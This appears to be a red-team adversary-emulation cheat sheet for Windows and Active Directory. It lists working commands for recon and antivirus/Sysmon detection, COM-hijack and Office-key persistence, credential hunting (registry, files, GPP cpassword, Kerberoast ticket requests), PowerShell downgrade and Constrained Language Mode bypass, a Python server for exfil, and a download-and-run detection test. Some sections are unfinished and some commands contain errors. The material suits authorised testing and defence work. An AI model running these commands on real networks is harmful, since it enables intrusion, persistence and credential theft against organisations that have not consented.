# **Adversary Emulation Test**

# **Table Of Contents:**
<!--ts-->
  * [Initial Access](#initial-access)
  * [Host Enumeration](#host-enumeration)
    * [Situational Awareness](#situational-awareness)
      * [Enumerate Antivirus](#enumerate-antivirus)
      * [VM Detection](#vm-detection)
      * [PowerShell Logging](#powershell-logging)
      * [PowerShell Constrained Language Mode](#powershell-constrained-language-mode)
      * [Detect Sysmon](#detect-sysmon)
      * [Detect Proxy](#detect-proxy)
    * [Enumerate Application Control](#enumerate-application-control)
    * [Enumerate Patches](#enumerate-patches)
      * [Get All HotFix Patches]($get-all-hotfix-patches)
      * [Get All KBs](#get-all-kbs)
    * [Check Cloud Information](#check-cloud-information)
      * [Device Join Type](#device-join-type)
      * [Enumerate Cloud Accounts](#enumerate-cloud-accounts)
    * [Firewall Enumeration](#firewall-enumeration)
      * [Get Firewall State](#get-firewall-state)
      * [Get Firewall Config](#get-firewall-config)
  * [Network Enumeration](#network-enumeration)
    * [Arp Scan](#arp-scan)
  * [Domain Enumeration](#domain-enumeration)
    * [User Enumeration](#user-enumeration)
      * [All User Accounts with Admin in Name](#all-user-accounts-with-admin-in-name)
      * [Enumerate Domain Admins](#enumerate-domain-admins)
      * [Enumerate Enterprise Admins](#enumerate-enterprise-admins)
      * [Enumerate Schema Admins](#enumerate-schema-admins)
    * [Service Account Enumeration](#service-account-enumeration)
      * [Find All Service Accounts and Their SPNs](#find-all-service-accounts-and-their-spns)
    * [Group Enumeration](#group-enumeration)
    * [Computer Enumeration](#computer-enumeration)
      * [Server Enumeration](#server-enumeration)
      * [Certificate Authority Enumeration](#certificate-authority-enumeration)
    * [GPO Enumeration](#gpo-enumeration)
    * [Organization Unit Enumeration](#organizational-unit-enumeration)
    * [Domain Trust Enumeration](#domain-trust-enumeration)
    * [Unconstrained Delegation](#unconstrained-delegation)
    * [Constrained Delegation](#constrained-delegation)
  * [Execution](#execution)
    * [PowerShell NET Assembly](#powershell-net-assembly)
    * [WMIC Execution](#wmic-execution)
  * [Persistence](#persistence)
    * [COM Hijacking](#com-hijacking)
    * [DLL Hijacking](#dll-hijacking)
    * [Office Applications](#office-applications)
      *[Word Office Test Registry Key](#word-office-test-registry-key)
  * [Credentials](#credentials)
    * [Enumerate Registry for Passwords](#enumerate-registry-for-passwords)
    * [Enumerate Specific File Names](#enumerate-specific-file-names)
    * [Enumerate Password KeyWord in Files](#enumerate-password-keyword-in-files)
    * [Scheduled Task Credentials](#scheduled-task-credentials)
    * [Enumerate cpassword in GPOs](#enumerate-cpassword-in-gpos)
    * [Kerberos Tickets](#kerberos-tickets)
      * [Service Accounts](#service-accounts)
  * [Privilege Escalation](#privilege-escalation)
    * [Abusing User Privileges](#abusing-user-privileges)
    * [Unquoted Service Path](#unquoted-service-path)
  * [Post Privilege Escalation](#post-privilege-ascalation)
    * [Adding Local User](#adding-local-user)
    * [Adding Defender Exclusion](#adding-defender-exclusion)
  * [Lateral Movement](#lateral-movement)
  * [Exfiltration](#exfiltration)
  * [Misc](#misc)
    * [PowerShell](#powershell)
      * [PowerShell Downgrade](#powershell-downgrade)
      * [Constrained Language Mode](#constrained-language-mode)
      * [AMSI Bypass](#amsi-bypass)
    * [Python](#python)
      * [Check if Python is Installed](#check-if-python-is-installed)
      * [Start HTTP Server for Exfil](#start-http-server-for-exfil)
    * [Putty](#putty)
      * []()
<!--te-->

# **Host Enumeration**

## **Situational Awareness**

### **Current User**

```
# whoami is commonly used to check current user context
whoami

# Can also use this command since whoami might trigger alerts
cmd.exe /c "set u"

# This will give more detailed information on the user including applied GPOs and Groups
gpresult.exe /r

# Enumerate current user's privileges
whoami /priv
```

### **Enumerate Antivirus**

```
# Method 1:
wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayname,productState,pathToSignedProductExe

# Method 2:
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
```

### **VM Detection**

```
[Bool](Get-WmiObject -Class Win32_ComputerSystem -Filter "NumberOfLogicalProcessors < 2 OR TotalPhysicalMemory < 2147483648")
```

### **PowerShell Logging**

```
# These Registries will inform us of the level of PowerShell logging

reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

### **PowerShell Constrained Language Mode**

```
$ExecutionContext.SessionState.LanguageMode
```

### **Detect Sysmon**

```
Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }
```

### **Detect Proxy**

```
netsh winhttp show proxy
```

## **Enumerate Application Control**

### **Check if Application Control is Enforced**

```
# If the *UsermodeCodeIntegrityPolicyEnforcementStatus* value is set to *2* then Application Control is enforced
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# For AppLocker Policies use this
Get-AppLockerPolicy -Local
```

### **Enumerate WDAC Binary Policy File**

```
ls C:\Windows\System32\CodeIntegrity | Select-String -SimpleMatch ".bin.p7b"
```

**NOTE:**

If this file exists attackers might try to exfil this file and use the tool *CIPolicyParser.ps1* to read the actual rules and find allowed executables in the environment

## **Check Cloud Information**

### **Device Join Type**

```
dsregcmd.exe /status
```

### **Enumerate Cloud Accounts**

```
dsregcmd.exe /listaccounts
```

## **Firewall Enumeration**

### **Get Firewall State**

```
# This information will show firewalll state
netsh.exe firewall show state
```

### **Get Firewall Config**

```
# This will show more detailed firewall info including logging location
netsh.exe firewall show config
```

# **Network Enumeration**

## **Arp Scan**

```
# this will find all hosts that the current device can reachusing arp
arp -a
```

# **Domain Enumeration**

## **User Enumeration**

### **Get All Domain Users**

```
net.exe user /DOMAIN
```

### **All User Accounts with Admin in Name**

```
net.exe user /DOMAIN | Select-String -SimpleMatch "admin"
```

This is another method to find Admin Accounts

```
(([ADSISearcher]"(AdminCount=1)").FindAll()).Properties.samaccountname
```

This is another method to find Admin Accounts

```
(([ADSISearcher]"(AdminCount=1)").FindAll()).Properties.samaccountname
```

### **Enumerate A Specific Admin User**

```
net.exe user <username> /DOMAIN | FL -Property *
```

## **Group Enumeration**

### **Enumerate All Domain Groups**

```
net.exe groupv /DOMAIN
```

### **Enumerate Groups with *Admin* in Name**

```
net.exe group /DOMAIN | Select-String -SimpleMatch "admin"
```

### **Enumerate Domain Admins**

```
net.exe group "Domain Admins" /DOMAIN | FL -property *
```

### **Enumerate Enterprise Admins**

```
net.exe group "Enterprise Admins" /DOMAIN | FL -property *
```

### **Enumerate Schema Admins**

```
net.exe group "Schema Admins" /DOMAIN | FL -property *
```

## **Service Account Enumeration**

### **Find All Service Acocunts and Their SPNs**

```
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.SearchRoot = [ADSI]"LDAP://DC=<domain>,DC=<domain>"
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

$searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
$searcher.PropertiesToLoad.Add("servicePrincipalName") | Out-Null

$results = $searcher.FindAll()

foreach ($result in $results)
{
 $account = $result.Properties["samaccountname"]
 $spns = $result.Properties["servicePrincipalName"]
 Write-Host "Account : $($account)"
 foreach ($spn in $spns)
 {
  Write-Host "SPN : $($spn)"
 }
}
```

## **Computer Enumeration**

### **Enumerate Domain Controllers**

```
nltest.exe /dclist:<domain>
```

### **Server Enumeration**

```
# Establish the LDAP filter
$searcher = [ADSISearcher]"(&(objectClass=computer)(operatingsystem=Windows Server*))"

# Execute Search
$searcher.FindAll() | ForEach-Object { $_.Properties.Name }
```

### **Certificate Authority Enumeration**

```
# Using certutil
certutil.exe -config - -ping

# LDAP query

```

## **GPO Enumeration**

### **Find all XML files in GPOs**

```
Get-ChildItem -Path "\\<domain>\SYSVOL\<domain>\Policies" -Recurse -Filter *.xml -ErrorAction SilentlyContinue
```

## **Organization Unit Enumeration**

```
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectCategory=organizationUnit)"
$searcher.SearchRoot = "LDAP://DC=<domain>,DC=<domain>"
$searcher.FindAll() | ForEach-Object { $_.Properties.distinguishedname }
```

## **Domain Trust Enumeration**

### **Find All Trusts**

Method 1

```
nltest.exe /domain_trusts
```

Method 2

```
$domain = System.DirectoryServices.DirectoryEntry("LDAP://CN=System,DC=<domain>,DC=<domain>")

$searcher = System.DirectoryServices.DirectorySearcher($domain)

$searcher.Filter = "(objectClass-trustedDomain)"

$searcher.FindAll() | ForEach-Object { $_.properties["name"] }
```

## **Unconstrained Delegation**

```
([ADSISearcher]"(userAccountControl:1.2.840.113556.1.4.803:=524288)").FindAll() | ForEach-Object {
    [PSCustomObject]@{
        ComputerName = $_.Properties.name
        DNSHostname = $_.Properties.dnshostname
        OS = $_.Properties.operatingsystem
        LastLogon = if ($_.Properties.lastlogon) { [datetime]::FromFileTime($_.Properties.lastlogon[0]) }
        Description = $_.Properties.description
    }
}
```

## **Constrained Delegation**

```
([ADSISearcher]"(msDS-AllowedToDelegateTo=*)").FindAll() | ForEach-Object {
    $_.Properties.name
}
```

# **Execution**

## **PowerShell NET Assembly**

### **Execute *calc.exe* Using NET Assembly Method**

```
# No-download method (calc.exe already exists on system)
[System.Diagnostics.Process]::Start("calc.exe")
```

## **WMIC Execution**

```
# These are some cool ways to execute programs. ASR rules should block this if on

wmic.exe /node:127.0.0.1 process call create "C:\Windows\system32\calc.exe"
wmic process call create  "\\?\UNC\127.0.0.1\C$\windows\system32\calc.exe"
wmic process call create "\\.\GLOBALROOT\??\UNC\127.0.0.1\C$\windows\system32\calc.exe"
wmic process call create "\\;lanmanredirector\127.0.0.1\C$\windows\system32\calc.exe"
wmic process call create "\\.\globalroot\osdataroot\windows\notepad.exe"
```

# **Persistence**

## **COM Hijacking**

**NOTE:**

For COM Hijacks you need a DLL to point to to execute. I created a DLL that runs *C:\Windows\System32\calc.exe* which you can use during the test and placed it in this GitHub Repo.

### **Enumerating COM Hijack Opportunities with ProcMon**

![image](https://github.com/user-attachments/assets/3d79926f-0854-4130-9dfb-47416b5248d3)


### **Enumerating Scheduled Tasks That Call COM Objects**

```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

### **Creating New InprocServer32 Registry Key/Value Pair**

```
# Create New CLSID Registry Key in HKCU where it was not defined
New-Item -Path "HKCU:\Software\Classes\CLSID" -Name "{<CLISD-ID>}"

# Set the InprocServer32 Key to point to your DLL
New-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}" -Name "InprocServer32" -Value "<Path-To-DLL>"

# Set threading to where this DLL gets executed on any COM object calls for this CLSID
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32" -Name "ThreadingModel" -Value "Both"

# Valid COM Object Registry properly set
Get-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32"

# Clean Up
Remove-Item "HKCU:\Software\Classes\CLSID\{<CLSID-ID>}" -Recurse
```

### **Common COM Objects to Target**

```
# TODO
```

## **Office Applications**

### **Word Office Test Registry Key**

```
# Once you create this registry key, the DLL will execute whenever Word is started
reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d <Path To DLL>

# CleanUp
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"
```

# **Credentials**

## **Enumerate Specific FileNames**

```
# These files have potential to have passwords stored in them
dir /s *pass* == *cred* == *vnc* == *.config*
```

## **Enumerate Password Keyword in Files**

```
# Looks for the keyword of *password* in certain file types
findstr /si password *.xml *.ini *.txt
```

## **Enumerate Registry for Passwords**

```
# Check HKLM
reg query HKLM /f password /t REG_SZ /s

# Check HKCU
reg query HKCU /f password /t REG_SZ /s
```

## **Scheduled Task Credentials**

```
# The systemprofile AppData contains credentials for scheduled tasks if present
ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
```

## **Enumerate cpassword in GPOs**

```
# Enumerate GPP XML files containing cpasswords in SYSVOL
function Get-GPPCPassword {
    $domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
    $sysvol = "\\$domain\SYSVOL\$domain\Policies\"
    
    Write-Host "`n[*] Searching for GPP cpasswords in: $sysvol`n" -ForegroundColor Cyan
    
    $files = Get-ChildItem -Path $sysvol -Recurse -Include Groups.xml, Services.xml, ScheduledTasks.xml, Printers.xml, Drives.xml -ErrorAction SilentlyContinue
    
    foreach ($file in $files) {
        try {
            [xml]$xml = Get-Content $file.FullName
            $nodes = $xml.SelectNodes("//Properties[@cpassword]")
            if ($nodes) {
                foreach ($node in $nodes) {
                    $user = $node.userName
                    $cpassword = $node.cpassword
                    Write-Host "[+] Found cpassword!" -ForegroundColor Green
                    Write-Host "    File     : $($file.FullName)"
                    Write-Host "    Username : $user"
                    Write-Host "    cpassword: $cpassword"
                    Write-Host ""
                }
            }
        } catch {
            Write-Warning "Error parsing $($file.FullName): $_"
        }
    }
}

# Run the function
Get-GPPCPassword
```

## **Kerberos Tickets**

### **Service Acounts**

**NOTE:**

Before doing this step you will want to enumerate for service acocunts in the domain which can be found in the *Domain Enumeration* section

**Request Ticket of a Service Acocunt**

```
# Validate there is not Kerberos ticket on device before execution
klist

# Add NET Type
Add-Type -AssemblyName System.IdentityModel

# Request Service Account Ticket
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"

# Validate Ticket is now on device
klist

# Clean-Up
klist purge
```

# **Privilege Escalation**

## **Abusing User Privileges**

Resource : https://github.com/gtworek/Priv2Admin

```
# Enumerate user privileges
whoami /priv

# Look at resource provided above to exploit privileges
```



## **Unquoted Service Path**

### **Enumeration of Unquoted Service Paths**

```
# Get all Serices
$services = Get-WmiObject -Class Win32_Service | Select-Object Name, PathName

# Pull out the service executable paths
$paths = $services.PathName

# Get Paths with Spaces
$vulnerable_paths = @()

foreach ($path in $paths)
{
    $executable = "$($($path -split '\.exe')[0])" + ".exe"
    if ($executable -contains " " -and -not $executable -contains "`"")
    {
        $vulnerable_paths += $executable
    } 
}

$vulnerable_paths
```

# **Misc**

## **Defender For Endpoint Test Detection**

```
powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
```

## **PowerShell**

### **PowerShell Downgrade**

```
# Test command before downgrade
echo "Mimikatz"

# Downgrade PowerShell to Version 2 which has less protections
powershell -version 2

# Test command after downgrade
echo "Mimikatz"
```

### **Constrained Language Mode**

#### **Detecting Constrained Language Mode**

```
$ExecutionContext.SessionState.LanguageMode
```

### **Circumvent Constrained Language Mode**

You can try the PowerShell downgrade attack mentioned above which should get you into a session with FullLanguage Mode

#### **System32 Bypass**

Create *test.ps1*

```
# Contents of test.ps1
$ExecutionContext.SessionState.LanguageMode
```

Run the following command:

```
# There is a bypass where if the string *System32* is in the path of the script it will gain FullLanguag Mode

.\test.ps1; mv .\test.ps1 system32.ps1; .\system32.ps1
```

## **Python**

### **Check If Python is Installed**

```
python --version
```

If python exists you can continue this path...

### **Start HTTP Server for Exfil**

```
# Start Simple HTTP Server
python -m http.server 4444

# If blocked by FireWall Rules create new Firewall Rule to allow inbound traffic on port 4444
# NOTE: You will need Administrative powershell session
New-NetFirewallRule -Name "Python Test- Delete" -Direction Inbound -LocalPort 4444 -Protocol TCP -Action Allow -Profile Any

# Clean-Up FireWall Rule
Remove-NetFirewallRule -DisplayName "<displayName>"
```

## **PuTTy**

```
# Enumerate this registry location for stored credentials
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\
```
